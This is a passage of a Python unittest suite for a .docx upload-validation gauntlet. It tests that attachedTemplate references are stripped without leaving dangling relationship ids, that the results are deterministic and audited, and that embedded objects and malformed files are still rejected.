    # The SAME element, written in paired start/end-tag form instead of
    # self-closed. CT_RelId carries no child content, so both spellings are
    # equivalent XML and equally valid OOXML -- an XML serializer that does
    # not special-case empty elements emits this one.
    '<w:attachedTemplate r:id="rId1"></w:attachedTemplate>'
    '<w:zoom w:percent="100"/>'
    "</w:settings>"
)


def _build_docx_with_paired_attached_template() -> bytes:
    """The same real-world document as `_build_docx_with_attached_template`,
    with the referencing element written in paired start/end-tag form.

    Stripping the .rels Relationship while LEAVING this element behind
    produces a `word/settings.xml` whose `r:id` resolves to nothing --
    exactly the dangling reference the module docstring says must never be
    left behind, and which makes Word show an "unreadable content" repair
    prompt when the attorney opens the stored document or its redline.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_PAIRED_ATTACHED_TEMPLATE)
        zf.writestr("word/_rels/settings.xml.rels", SETTINGS_RELS_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


SETTINGS_XML_WITH_UNRECOGNIZED_ATTACHED_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:settings '
    'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    # An attachedTemplate element the strip regex deliberately does NOT
    # match: CT_RelId carries no child content, so this is not a spelling of
    # the empty element and must not be silently deleted. It stands in for
    # any element form the sanitizer cannot recognize.
    '<w:attachedTemplate r:id="rId1"><w:unexpectedChild/></w:attachedTemplate>'
    "</w:settings>"
)


def _build_docx_with_unrecognized_attached_template_element() -> bytes:
    """A package whose .rels DOES declare an attachedTemplate relationship
    (so it will be stripped) but whose settings.xml spells the referencing
    element in a form the sanitizer cannot safely remove."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES_WORDPROCESSINGML)
        zf.writestr("_rels/.rels", RELS_XML_BENIGN)
        zf.writestr("word/document.xml", DOCUMENT_XML_MINIMAL)
        zf.writestr("word/settings.xml", SETTINGS_XML_WITH_UNRECOGNIZED_ATTACHED_TEMPLATE)
        zf.writestr("word/_rels/settings.xml.rels", SETTINGS_RELS_WITH_ATTACHED_TEMPLATE)
    return buf.getvalue()


class TestAttachedTemplateSanitization(unittest.TestCase):
    def test_attached_template_is_sanitized_not_rejected(self) -> None:
        payload = _build_docx_with_attached_template()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="drafted-from-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-14",
        )
        # No HostileFileError -- the upload proceeds -- but the stored bytes
        # are NOT byte-identical to what was uploaded: the template
        # reference is gone.
        self.assertNotEqual(result, payload)

        result_zf = zipfile.ZipFile(io.BytesIO(result))
        self.assertNotIn(b"attachedTemplate", result_zf.read("word/settings.xml"))
        self.assertNotIn(b"attachedTemplate", result_zf.read("word/_rels/settings.xml.rels"))
        # No dangling r:id left behind in settings.xml either.
        self.assertNotIn(b"r:id", result_zf.read("word/settings.xml"))

        # Nothing else in the archive was touched or dropped.
        original_names = set(zipfile.ZipFile(io.BytesIO(payload)).namelist())
        self.assertEqual(set(result_zf.namelist()), original_names)
        self.assertEqual(
            result_zf.read("word/document.xml"), DOCUMENT_XML_MINIMAL.encode("utf-8")
        )

        # The sanitization is recorded in the audit trail -- substance-free
        # (no document text, no raw template path), but says WHAT was
        # stripped and FROM WHICH part.
        self.assertEqual(len(audit.rows), 1)
        self.assertEqual(audit.rows[0]["action"], "upload_sanitized")
        self.assertEqual(audit.rows[0]["reason_code"], "attached_template_stripped")
        self.assertIn("settings.xml", audit.rows[0]["detail"])
        self.assertNotIn("Program Files", audit.rows[0]["detail"])
        self.assertNotIn("Hello", audit.rows[0]["detail"])  # no document body text

    def test_document_without_attached_template_returns_original_bytes_object(self) -> None:
        """The overwhelmingly common path (no attachedTemplate anywhere)
        must be a true no-op: the ORIGINAL bytes object, not a re-zipped
        copy that happens to compare equal."""
        payload = _build_valid_docx()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="clean.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-15",
        )
        self.assertIs(result, payload)
        self.assertEqual(audit.rows, [])

    def test_attached_template_sanitized_while_hyperlink_still_passes(self) -> None:
        """Mirrors the real repro: an attachedTemplate relationship AND a
        legitimate external hyperlink in the same document. The hyperlink
        must survive untouched; only the template reference is stripped."""
        payload = _build_docx_with_attached_template_and_hyperlink()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="real-repro-shape.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-16",
        )
        result_zf = zipfile.ZipFile(io.BytesIO(result))
        hyperlink_rels = result_zf.read("word/_rels/document.xml.rels")
        self.assertIn(b"hyperlink", hyperlink_rels)
        self.assertIn(b"example.box.com", hyperlink_rels)
        self.assertNotIn(b"attachedTemplate", result_zf.read("word/_rels/settings.xml.rels"))
        self.assertEqual(len(audit.rows), 1)
        self.assertEqual(audit.rows[0]["reason_code"], "attached_template_stripped")

    def test_attached_template_sanitized_but_embedded_object_still_rejected(self) -> None:
        """Sanitizing the template reference must NOT widen the gate for an
        embedded OLE object sitting alongside it in the same document."""
        payload = _build_docx_with_attached_template_and_embedded_object()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="template-plus-ole.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=av,
                audit_write=audit,
                review_id="rev-17",
            )
        self.assertEqual(ctx.exception.reason_code, "embedded_object")

    def test_multiple_attached_template_relationships_all_stripped(self) -> None:
        """Two attachedTemplate Relationship entries, only one with a
        matching settings.xml element -- both relationships must be
        stripped; the orphan (rId2, no matching element) must not crash
        anything."""
        payload = _build_docx_with_multiple_attached_template_relationships()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="multi-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-18",
        )
        result_zf = zipfile.ZipFile(io.BytesIO(result))
        rels_xml = result_zf.read("word/_rels/settings.xml.rels")
        self.assertNotIn(b"rId1", rels_xml)
        self.assertNotIn(b"rId2", rels_xml)
        self.assertNotIn(b"attachedTemplate", rels_xml)
        self.assertNotIn(b"attachedTemplate", result_zf.read("word/settings.xml"))

    def test_attached_template_relationship_with_no_settings_element_still_stripped(
        self,
    ) -> None:
        """A rel exists with no matching w:attachedTemplate element anywhere
        (element already absent) -- the orphaned relationship is still
        stripped and nothing crashes looking for a nonexistent element."""
        payload = _build_docx_with_attached_template_rel_but_no_settings_element()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="orphan-rel.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-19",
        )
        result_zf = zipfile.ZipFile(io.BytesIO(result))
        self.assertNotIn(b"attachedTemplate", result_zf.read("word/_rels/settings.xml.rels"))
        self.assertEqual(len(audit.rows), 1)

    def test_dangling_settings_element_with_no_relationship_is_untouched(self) -> None:
        """word/settings.xml references an Id that has no Relationship
        anywhere in the archive -- there is no attachedTemplate
        RELATIONSHIP to trigger sanitization on, so this must be a
        complete no-op (original bytes object, unchanged), leaving the
        pre-existing (already-broken, not introduced by us) dangling
        reference exactly as uploaded."""
        payload = _build_docx_with_dangling_attached_template_element_only()
        av = _FakeAvClient()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="dangling-element-only.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-20",
        )
        self.assertIs(result, payload)
        self.assertEqual(audit.rows, [])


    def test_paired_tag_attached_template_element_leaves_no_dangling_rid(self) -> None:
        """A `<w:attachedTemplate r:id="rId1"></w:attachedTemplate>` is the
        same element as the self-closed spelling, and must be removed the
        same way. Stripping only the .rels side leaves `settings.xml`
        pointing at a relationship id that no longer exists -- the exact
        dangling reference `_sanitize_attached_template_relationships`'s own
        docstring promises never to leave, and a repair prompt for whoever
        opens the document we stored or the redline we generated from it.
        """
        payload = _build_docx_with_paired_attached_template()
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="paired-tag-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=_FakeAvClient(),
            audit_write=audit,
            review_id="rev-21",
        )
        result_zf = zipfile.ZipFile(io.BytesIO(result))
        settings_xml = result_zf.read("word/settings.xml")
        rels_xml = result_zf.read("word/_rels/settings.xml.rels")
        self.assertNotIn(b"attachedTemplate", rels_xml)
        self.assertNotIn(
            b"attachedTemplate",
            settings_xml,
            msg=(
                "the relationship was stripped but its referencing element "
                "was not -- settings.xml now carries a dangling r:id"
            ),
        )
        self.assertNotIn(b'r:id="rId1"', settings_xml)
        # The rest of settings.xml is intact -- this is surgical removal of
        # one element, not a rewrite of the part.
        self.assertIn(b"<w:zoom", settings_xml)
        # And it is reported as a real element removal, not as the
        # "relationship with no referencing element" case.
        self.assertIn("element_removed=True", audit.rows[0]["detail"])

    def test_sanitization_is_deterministic_for_the_same_upload(self) -> None:
        """`post_review` hashes the gauntlet's RETURN value and keys the
        idempotent-retry path off that hash. Two runs over the same upload
        must therefore produce byte-identical output -- a re-zip that varied
        (timestamps, entry order, compression) would give the same document
        two different hashes and defeat retry idempotency.
        """
        payload = _build_docx_with_attached_template()
        first = uv.run_upload_gauntlet(
            payload,
            filename="drafted-from-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=_FakeAvClient(),
            audit_write=_FakeAuditSink(),
            review_id="rev-22",
        )
        second = uv.run_upload_gauntlet(
            payload,
            filename="drafted-from-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=_FakeAvClient(),
            audit_write=_FakeAuditSink(),
            review_id="rev-23",
        )
        self.assertEqual(first, second)

    def test_gauntlet_over_already_sanitized_bytes_is_a_no_op(self) -> None:
        """Sanitized output must itself pass the gauntlet unchanged: it is
        what gets stored, and anything that re-validates it later (or a
        retry that re-submits it) must not keep re-zipping it into new
        bytes with a new hash.
        """
        payload = _build_docx_with_attached_template()
        once = uv.run_upload_gauntlet(
            payload,
            filename="drafted-from-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=_FakeAvClient(),
            audit_write=_FakeAuditSink(),
            review_id="rev-24",
        )
        audit = _FakeAuditSink()
        twice = uv.run_upload_gauntlet(
            once,
            filename="drafted-from-template.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=_FakeAvClient(),
            audit_write=audit,
            review_id="rev-25",
        )
        self.assertIs(twice, once)
        self.assertEqual(audit.rows, [])


    def test_unremovable_referencing_element_fails_closed(self) -> None:
        """The sanitizer must never trade a rejected upload for a CORRUPT
        one. If the relationship is stripped but the owner part still
        references an attachedTemplate -- an element form the strip regex
        does not recognize -- the stored document would carry a dangling
        r:id and Word would show the attorney a repair prompt on a file this
        pipeline produced. Reject instead, visibly and with an audit row.
        """
        payload = _build_docx_with_unrecognized_attached_template_element()
        audit = _FakeAuditSink()
        with self.assertRaises(uv.HostileFileError) as ctx:
            uv.run_upload_gauntlet(
                payload,
                filename="unrecognized-template-element.docx",
                declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                av_client=_FakeAvClient(),
                audit_write=audit,
                review_id="rev-26",
            )
        self.assertEqual(ctx.exception.reason_code, "attached_template_sanitize_failed")
        self.assertTrue(audit.rows, "a rejection must be audited")


# ---------------------------------------------------------------------------
# 9. Happy path — a clean, benign .docx passes every gate
# ---------------------------------------------------------------------------


class TestHappyPath(unittest.TestCase):
    def test_valid_benign_docx_passes_and_is_not_audited_as_failure(self) -> None:
        payload = _build_valid_docx()
        av = _FakeAvClient(verdict="CLEAN")
        audit = _FakeAuditSink()
        result = uv.run_upload_gauntlet(
            payload,
            filename="clean.docx",
            declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            av_client=av,
            audit_write=audit,
            review_id="rev-12",
        )
        self.assertEqual(result, payload)
        self.assertEqual(len(av.scanned_payloads), 1)
        # No failure audit row was written on the success path (the caller
        # is responsible for the normal submission audit trail).
        self.assertEqual(audit.rows, [])


# ---------------------------------------------------------------------------
# 10. Failed validation never reaches the pipeline (HTTPException mapping)
# ---------------------------------------------------------------------------


class TestHttpMapping(unittest.TestCase):
    def test_hostile_file_error_maps_to_client_error_and_blocks_pipeline_handoff(self) -> None:
        payload = _build_mime_mismatch_file()
        av = _FakeAvClient()
        audit = _FakeAuditSink()

        called_pipeline_handoff = {"called": False}

        def fake_handoff(_bytes: bytes) -> None:
            called_pipeline_handoff["called"] = True

        with self.assertRaises(HTTPException) as ctx:
            try:
                validated = uv.run_upload_gauntlet(
                    payload,
                    filename="fake.docx",
                    declared_content_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    av_client=av,
                    audit_write=audit,
                    review_id="rev-13",
                )
                fake_handoff(validated)
            except uv.HostileFileError as exc:
                raise uv.to_http_exception(exc) from exc

        self.assertEqual(ctx.exception.status_code, 400)
        self.assertFalse(
            called_pipeline_handoff["called"],
            "A file that fails validation must never be handed to the pipeline.",
        )


def _run_suite() -> bool:
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    for test_case in (
        TestOversizedRequest,
        TestZipBomb,
        TestMimeMismatch,
        TestAvScan,
        TestEntityExpansion,
        TestExternalRelationship,
        TestEmbeddedObject,
        TestMacroEnabledTemplate,
        TestAttachedTemplateSanitization,
        TestHappyPath,
        TestHttpMapping,
    ):
        suite.addTests(loader.loadTestsFromTestCase(test_case))
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return result.wasSuccessful()


if __name__ == "__main__":
    ok = _run_suite()
    sys.exit(0 if ok else 1)
